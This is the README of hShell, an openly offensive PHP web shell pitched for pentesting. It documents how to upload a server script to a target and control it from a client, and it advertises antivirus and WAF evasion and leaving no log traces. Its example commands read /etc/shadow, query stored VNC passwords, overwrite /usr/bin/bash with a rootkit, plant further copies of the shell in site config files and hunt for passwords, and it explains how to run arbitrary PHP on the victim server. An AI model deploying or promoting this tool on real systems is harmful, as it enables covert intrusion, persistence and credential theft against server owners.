# WHK hShell

Web-Shell for professional use as a pentester writed in __<?php__


## Advantage

- The core of the shell is on the client's side.
- It leaves no traces because the code is not stored on the server side.
- No server-side interventions are required to perform updates.
- Interpretable code sent from the client, this prevents the detection of the antivirus.
- Transport of obfuscated code for the prevention of WAF detection.
- The data transport uses HTTP / POST requests, prevents leaving traces in logs of WEB servers.
- Use random payload on the HTTP / POST body for prevention of WAF detection.
- Supports large amounts of code due to the sending of requests via multipart/form-data.


## How to use?

The php server script must be uploaded on the server to be controlled. Then you must run the client.php from the terminal and indicate the path of the server.php:

    whk@machine:~$ php client.php 
    ──────────── Welcome to hShell 💀 v0.7 Alpha ───────────────── 
     Author             : WHK@elhacker.net                         
     For bugs & updates : https://github.com/WHK102/hShell         
     Thanks             : To my computer, coffee and the weekend   
    ──────────────────────────────────────────────────────────────
    + Connect to url: https://whk.cl/server.php
    + Connecting ...
    + Connected!
    h-Shell:/home/whk.cl/public_html/> id
    uid=0(root) gid=0(root)
    hShell:/home/whk.cl/public_html/> exec ls -la
    total 1
    drwxrwxr-x.  5 whk.cl whk.cl  4096 Feb 10 17:33 .
    drwx------.  6 whk.cl whk.cl  4096 Oct  8 15:08 ..
    -rw-r--r--.  1 root   root    1388 Feb 10 21:38 server.php
    hShell:/home/whk.cl/public_html/> force-exec explicit ls -la
    total 1
    drwxrwxr-x.  5 whk.cl whk.cl  4096 Feb 10 17:33 .
    drwx------.  6 whk.cl whk.cl  4096 Oct  8 15:08 ..
    -rw-r--r--.  1 root   root    1388 Feb 10 21:38 server.php
    h-Shell:/home/whk.cl/public_html/> exit
    ! Bye.


## Commands available

    hShell:/> help
     ──────────────────────────────────────────────────
      Command     : help 
      Status      : stable
      Description : Show current help messages.
     ──────────────────────────────────────────────────
      Command     : connect [url]
      Example     : connect http://127.0.0.1/server.php
      Status      : stable
      Description : Connect to Server WebShell script.
     ──────────────────────────────────────────────────
      Command     : cat [file path]
      Example     : cat /etc/passwd
      Status      : stable
      Description : Show the content of remote file.
     ──────────────────────────────────────────────────
      Command     : tail [file path]
      Example     : tail /var/log/secure
      Status      : unimplemented
      Description : Read the last lines of specific file.
     ──────────────────────────────────────────────────
      Command     : cd [directory]
      Example     : cd /home/
      Status      : stable
      Description : Navigate to specific remote directory.
     ──────────────────────────────────────────────────
      Command     : uname 
      Status      : stable
      Description : Show the full info of the System Operative of the server.
     ──────────────────────────────────────────────────
      Command     : exec [command]
      Example     : exec reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
      Status      : stable
      Description : Execute a simple command in remote server using the current remote path. Detect automatic available method on the server. See the force-exec command.
     ──────────────────────────────────────────────────
      Command     : force-exec [method] [command]
      Example     : force-exec passthru reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
      Status      : stable
      Description : Force execute a simple command in remote server using an specific php method in current path. Available methods: system, exec, shell_exec, passthru, popen, proc_open, explicit (using double quotes ``).
     ──────────────────────────────────────────────────
      Command     : edit [editor command] [remote file path]
      Example     : edit vi /etc/shadow
      Status      : unimplemented
      Description : Edit remote file with specific local command edtor
     ──────────────────────────────────────────────────
      Command     : nano [remote file path]
      Example     : nano /etc/shadow
      Status      : unimplemented
      Description : Edit remote file with nano editor on the local system.
     ──────────────────────────────────────────────────
      Command     : vi [remote file path]
      Example     : vi /etc/shadow
      Status      : unimplemented
      Description : Edit remote file with vi editor on the local system.
     ──────────────────────────────────────────────────
      Command     : vim [remote file path]
      Example     : vim /etc/shadow
      Status      : unimplemented
      Description : Edit remote file with vim editor on the local system.
     ──────────────────────────────────────────────────
      Command     : gedit [remote file path]
      Example     : gedit /etc/shadow
      Status      : unimplemented
      Description : Edit remote file with gedit editor on the local system.
     ──────────────────────────────────────────────────
      Command     : notepad [remote file path]
      Example     : notepad /etc/shadow
      Status      : unimplemented
      Description : Edit remote file with notepad.exe editor on the local system (only on local windows systems).
     ──────────────────────────────────────────────────
      Command     : sublime [remote file path]
      Example     : sublime /etc/shadow
      Status      : unimplemented
      Description : Edit remote file with sublime editor on the local system.
     ──────────────────────────────────────────────────
      Command     : mysql [host] [port] [user] [password]
      Example     : mysql localhost 3306 root 123456
      Status      : unimplemented
      Description : Start an interative MySQL session
     ──────────────────────────────────────────────────
      Command     : mysqldump [host] [port] [user] [password] [local file]
      Example     : mysql localhost 3306 root 123456 ./dump.sql
      Status      : unimplemented
      Description : Make a dump from remote database to local SQL file
     ──────────────────────────────────────────────────
      Command     : download [remote path] [local path]
      Example     : download /home/site/public_html ./backup
      Status      : unimplemented
      Description : Download a backup of file or directory from server to local path. If path finish with "/" download the content of folder (like as rsync). Not need a ssh access.
     ──────────────────────────────────────────────────
      Command     : upload [local path] [remote path]
      Example     : upload ./rootkit.bin /usr/bin/bash
      Status      : unimplemented
      Description : Upload a local file or directory to remote directory (maintains the same permits)
     ──────────────────────────────────────────────────
      Command     : mkdir [remote path]
      Example     : mkdir /tmp/backup/
      Status      : stable
      Description : Make a directory on the server.
     ──────────────────────────────────────────────────
      Command     : rm [remote path]
      Example     : rm /tmp/backup/
      Status      : stable
      Description : Delete the specific file or directory path.
     ──────────────────────────────────────────────────
      Command     : phpinfo 
      Status      : stable
      Description : Show the full info of the php, libraries and enviroments of the server.
     ──────────────────────────────────────────────────
      Command     : id 
      Status      : stable
      Description : Show the full info of the current user and group on the server.
     ──────────────────────────────────────────────────
      Command     : ls 
      Status      : stable
      Description : List files and folders of the current path on the server. Alias of ll and dir commands.
     ──────────────────────────────────────────────────
      Command     : shellpath 
      Status      : stable
      Description : Show the current local path of the WebShell server.
     ──────────────────────────────────────────────────
      Command     : pwd 
      Status      : stable
      Description : Show the current local path on the server.
     ──────────────────────────────────────────────────
      Command     : install [remote file path]
      Example     : install /home/website/public_html/admin/config.php
      Status      : stable
      Description : Install a copy of the WebShell on the specific remote parh, if the directory does not exist, it will create it recursively.
     ──────────────────────────────────────────────────
      Command     : uninstall 
      Status      : stable
      Description : Uninstall the current WebShell on the server.
     ──────────────────────────────────────────────────
      Command     : find-passwords
      Status      : Alpha
      Description : Search for all possible common passwords on the remote server.
     ──────────────────────────────────────────────────
      Command     : exit 
      Status      : stable
      Description : Exit of the client but not remove the WebShell on the server. See uninstall. Alias of quit command.


## Execute own codes without modifying the server

You can create and execute your own codes made in PHP language by creating specific functions for it.

### Howto make a custom functions?

In the client.php create a new function with name "cmd_foo"

    private function cmd_myFunction($argv, $debug_level = 1)
    {
        // ...
    }

By example:

    private function cmd_myFunction($argv, $debug_level = 1)
    {
        $result = $this->sendBuffer('
            $result = "done!";
        ');
        
        $this->log($result, $debug_level);
        return $result;
    }

Where `$result = "done!";` is your code that will run on the server. The `$result` is the variable for return the string of result to the client. The `$this->log` function display the message on terminal and `$debug_level` is the level of debug: 1 = Show text and status, 0 = Hidde all messages. The function return the final result.

For large return messages use callbacks for prevent exhaust of memory on the client, example:

    private function cmd_myFunction($argv, $debug_level = 1)
    {
        $result = $this->sendBuffer('
            for($i = 0; $i <= 50000; $i++)
            {
                echo 'FOO';
            }
        ', 'self::callbackCommandGenericFlush', true);
    }

See the `', 'self::callbackCommandGenericFlush', true);` when `self::callbackCommandGenericFlush` is the callback for print each line in real time without keep the lines in a local variable. Note: the out of buffer is a raw `echo`, dont use `$return`.

Now, need register your command in `__construct()` function like as:

    // Register functions
    $this->functions   = array(
        'myFunction'      => array( // <- Your command
            'args'        => '',
            'example'     => '',
            'description' => 'Demo function.',
            'status'      => 'stable',
            'function'    => 'cmd_myFunction' // <- Your function
        ),
        ...

Now, call your command:

    hShell:/> myFunction

For arguments use `$argv`, is a array of arguments (separated by blank space). For join all arguments use `implde`, by example: `$argument = implode(' ', $argv)`.
For more help, see the source code or write a email to [me](mailto:whk@elhacker.net)


## Do not be bad
Use this script only under controlled environments where you have permission to execute it. There is no guarantee of its functionality or use, please proceed with discretion.


## How to contribute?

|METHOD                 |WHERE                                                                                        |
|-----------------------|---------------------------------------------------------------------------------------------|
|Donate                 |[Paypal](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=KM2KBE8F982KS) |
|Find bugs              |Using the [Issues tab](https://github.com/WHK102/hShell/issues)                              |
|Providing new ideas    |Using the [Issues tab](https://github.com/WHK102/hShell/issues)                              |
|Creating modifications |Using the [Pull request tab](https://github.com/WHK102/hShell/pulls)                         |
